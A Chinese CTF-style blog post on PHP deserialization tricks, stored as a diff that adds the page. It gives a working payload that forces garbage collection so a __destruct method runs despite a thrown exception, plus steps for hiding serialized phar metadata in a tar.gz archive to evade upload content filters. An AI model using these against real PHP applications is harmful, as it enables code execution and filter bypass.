@@ -1,0 +1,206 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>php反序列化小trick之强制GC - Guoyanan</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Expect Us,​    这个trick非常冷门，google了半天都没找到，还是在大佬给的链接里找到的。
+​    先来看一个demo：
+12345678910111213141516&amp;lt;?php highl,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Guoyanan" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Guoyanan</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">php反序列化小trick之强制GC</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">php反序列化小trick之强制GC</h1>
+        <div class="stuff">
+            <span>十一月 02, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>​    这个trick非常冷门，google了半天都没找到，还是在大佬给的链接里找到的。</p>
+<p>​    先来看一个demo：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"> </span><br><span class="line">$flag &#x3D;&quot;flag&#123;&quot;.md5(time).&quot;&#125;&quot;;</span><br><span class="line"> </span><br><span class="line">class B &#123;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">            echo &quot;successful\n&quot;;</span><br><span class="line">            echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">unserialize($_GET[1]);</span><br><span class="line"> </span><br><span class="line">throw new Exception(&#39;中途退出啦&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>我们假如要执行__destruct方法，打印flag，就得绕过这个throw new Exception。</p>
+<p>因为__destruct方法是在该对象被回收时调用，而exception会中断该进程对该对象的销毁。</p>
+<p>所以我们需要强制让php的GC（垃圾回收机制）去进行该对象的回收。</p>
+<p>​    这里有篇文章讲了如何去触发GC：<a href="https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/#Triggering_the_GC_during_Unserialization" target="_blank" rel="noopener">https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/#Triggering_the_GC_during_Unserialization</a></p>
+<p>​    核心思想就是：“the key is to unserialize an array but re-use an earlier index, causing it to trigger GC”</p>
+<p>也就是说，我们需要反序列化一个数组，然后再利用第一个索引，来触发GC。</p>
+<p>用代码表达如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;array();</span><br><span class="line">$a[0]&#x3D;new B();</span><br><span class="line">$a[1]&#x3D;new B();</span><br><span class="line">.....</span><br><span class="line">unserialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class B&#123;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		echo &quot;NaN1g&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line">echo serialize(array(new B, new B));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;a:2:&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:1;O:1:&quot;B&quot;:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后，我们需要提交的payload是<code>?1=a:2{i:0;O:1:&quot;B&quot;:0:{}i:0;i:0;}</code></p>
+<p>这样就能成功执行魔术方法了。</p>
+<p>另外再记录一个phar的trick，好像也搜不到。</p>
+<p>关于绕过滤，大部分想到的就是compress.zip绕协议头这一点。</p>
+<p>但是还有一个tar.gz绕文件内容检测的trick</p>
+<p>例如，对于：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(preg_match(&quot;&#x2F;\&lt;?php|__HALT_COMPILER\(\)|XXXXXX&gt;&#x2F;&quot;))；</span><br><span class="line">	die(&quot;no&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>这样的检测，我们如何绕过呢？</p>
+<p>方法如下：</p>
+<p>1、先新建一个<code>.phar</code>文件夹</p>
+<p>2、再在里面创建一个<code>.metadata</code>文件</p>
+<p>3、在metadata文件里填入序列化的字符串</p>
+<p>4、把.phar文件夹压缩为tar，再压缩为gz</p>
+<p>上传后用phar协议触发就能执行，而且可以绕过上面的检测</p>
+<p>（可以用xxd看下它和普通phar文件的不同。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='true'
+        data-ci='2b954438d2f5ca9e36a0'
+        data-cs='e36607cd1943678e41a7095a67641166a303ec4e'
+        data-r='guoyanan1g.github.io'
+        data-o='guoyanan1g'
+        data-a='guoyanan1g'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+				
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
